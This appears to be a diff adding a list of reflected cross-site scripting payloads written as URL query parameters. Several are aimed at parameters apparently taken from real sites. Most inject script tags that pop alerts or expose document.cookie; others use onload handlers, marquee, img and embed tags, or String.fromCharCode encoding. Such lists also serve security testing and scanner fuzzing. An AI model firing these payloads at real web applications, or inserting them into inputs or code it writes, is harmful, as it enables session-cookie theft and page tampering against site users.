@@ -1,0 +1,17 @@
+&siteId="<img src="http://thumbs.reddit.com/t5_2qxe8.png
+&q=%3Cscript%3Ealert(%22XSS%22)%3C/script%3E
+&page=answers&type=search&searchid=1260543686413&question_box=rddt%3Cbody%20onload=alert%28document.cookie%29%3Erddt&ichbox[]=en-US
+&SQ=%22xss+protection%3Cscript%3Ealert%28document.cookie%29%3B%3C%2Fscript%3E%22&act=RSR&searchAID=&forumID=8
+&page=answers&type=search&searchid=%22%3Cmarquee%3E%3Cimg+src%3D%27http%3A%2F%2Fstatic.reddit.com%2Freddit.com.header.png%27%2F%3E%3C/marquee%3E
+&q=%22%3Cscript%3Ealert%28%22HA!%22%29;%3C/script%3E%3Cp
+&Ntk=All&Ntx=mode+matchallpartial
+&qry=duh&searchKey=television&skp=17_163&tgt=%27;!--%22%3E%3Cembed%20width=600%20height=500%20src=http://www.youtube.com/v/8n1hKQULa9Y%3E
+&RequestedPage=%27%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E%3Cp
+&Query=%22%3Cmarquee%3E%3Cstrike%3E%3CIMG+SRC%3D%22http://i.imgur.com/X2rwY.jpg%22%3E%3Cscript%3Ealert%28%22smrk3r%22%29%3B%3C%2Fscript%3E%3Cp&target=article
+&&tutorial=%22%3Cmarquee%3EPreventing%20xss%20attacks%3Ca
+&symb=%22%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E%3Ca
+&id=2869&action=register&redirectfullurl=%22%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E%3Ca
+&partNumber=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+&productPageUrl="><script>alert(String.fromCharCode(88,83,83))</script>
+&finalDestination="><script>alert('You have been hacked!')</script>
+&search=<script>alert(document.cookie)</script>
